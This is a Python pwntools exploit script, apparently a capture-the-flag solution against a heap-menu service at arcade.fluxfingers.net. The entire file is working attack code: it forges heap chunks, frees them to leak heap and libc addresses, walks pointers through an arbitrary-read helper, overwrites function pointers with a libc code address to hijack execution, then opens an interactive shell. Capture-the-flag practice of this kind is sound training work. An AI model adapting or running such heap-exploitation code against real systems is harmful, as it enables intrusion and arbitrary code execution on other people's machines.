from pwn import *

HOST, PORT = "arcade.fluxfingers.net", "1809"
# HOST, PORT = "172.17.0.2", 31338

context.log_level = 'error'

try:
	locals_libc
	remote_libc
except:
	# locals_libc = ELF('Downloads/libc.so.6')
	if HOST == 'arcade.fluxfingers.net' or 1:
		initial = 0x1bfbe8
		arena = 0x1bea00
	else:
		initial = 0x3ecd80
		arena = 0x3ebc00

menu = lambda: r.recvuntil("exit")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[1]

c = lambda: r.recvuntil('?\n')

def write(offset, content):
	ii(1)
	ii(len(content))
	ii(offset)
	r.send(content)

def free(offset):
	ii(3)
	ii(offset)

def leak(offset):
	ii(4)
	ii(offset)
	r.recvuntil('leak?\n')
	data = r.recvuntil('\nPlease', drop=True)
	return data

def leakptr(offset):
	return u64(leak(offset).ljust(8, '\x00'))

@MemLeak
def leak_by_address(address):
	write(0x1008, p64(address))
	return leak(0x1008) + '\x00'

while True:
	r = remote(HOST, PORT)
	chunk = p64(0x91) + 'a' * 0x88 + p64(0x21) + p64(0) * 3 + p64(1)
	chunk_small = p64(0x21) + 'a' * 0x18 + p64(0x21) + p64(0) * 3 + p64(1)
	size = 0xa0
	skip = False
	for i in range(8):
		write(size * i + 8, chunk)
		free(size * i + 16)
		if i == 2:
			ptr = leakptr(0xa0*2+16)
			print hex(ptr)

	if skip:
		r.close()
		continue
	cmd = 'echo pwned'
	write(0x10, cmd + '\x00')
	heap = ptr - 0x10
	write(0x1000, p64(ptr-0x10+0xa0*7+16+1))
	ptr = leakptr(0x1000)*0x100
	print hex(ptr)
	libc = (ptr - arena) & ~0xfff
	print hex(libc)
	addr = leak_by_address.q(libc + 0x1bde28)
	addr = leak_by_address.q(addr + 40)
	addr = leak_by_address.q(addr)
	addr = leak_by_address.q(addr)
	struct = leak_by_address.q(addr + 0x4040)
	print hex(struct)
	write(8, chunk_small)
	write(0x1008, chunk_small)
	free(16)
	free(0x1000 + 16)
	pc2 = libc + 0x858d0
	pc1 = libc + 0x72a40
	pc1 = pc2 = libc + 0xe75f0
	write(0x1000 + 16, p64(pc1) + p64(pc2))
	free(-heap + struct)
	pause()
	r.interactive()
	break
